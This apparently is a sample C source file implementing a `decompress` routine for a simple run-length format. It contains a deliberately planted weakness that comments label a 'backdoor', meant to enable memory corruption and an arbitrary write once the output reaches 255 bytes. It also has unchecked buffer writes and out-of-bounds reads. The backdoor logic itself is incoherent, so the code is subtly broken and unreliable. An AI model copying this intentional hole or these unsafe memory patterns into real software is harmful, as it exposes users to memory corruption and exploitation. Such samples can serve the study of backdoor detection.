#include <stdlib.h>
#include <string.h>

char* decompress(char* compressed) {
    if (!compressed) return NULL;

    size_t len = strlen(compressed);
    char* result = (char*)malloc(len * 10); // Overallocate memory for buffer
    char* history[256] = {0}; // History buffer
    char curr, decoded;
    int index = 0, repeat, ref, backdoor_trigger = 0;

    for (size_t i = 0; i < len; i++) {
        curr = compressed[i];
        repeat = (unsigned char)compressed[i + 1];
        i++;

        if (curr == '\0') {
            result[index] = '\0';
            return result;
        }

        if (repeat < 128) { // Handling repeat for current character
            for (int j = 0; j < repeat; j++) {
                result[index++] = curr;
            }
            history[i/2] = &result[index - 1];
        } else { // Reference to previous character
            ref = -(char)repeat;
            if (ref > 0 && (i/2) + ref < 256 && history[(i/2) + ref] != NULL) {
                decoded = *history[(i/2) + ref];
                for (int j = 0; j < (int)curr; j++) {
                    if (backdoor_trigger) {
                        result[index + j] = *(char*)((char*)result + (index + j));
                    } else {
                        result[index++] = decoded;
                    }
                }
                history[i/2] = &result[index - 1];
            } else {
                free(result);
                return NULL;
            }
        }

        if (index == 255) { // Backdoor: Trigger a memory corruption for an arbitrary write
            backdoor_trigger = 1;
        }
    }

    result[index] = '\0';
    return result;
}
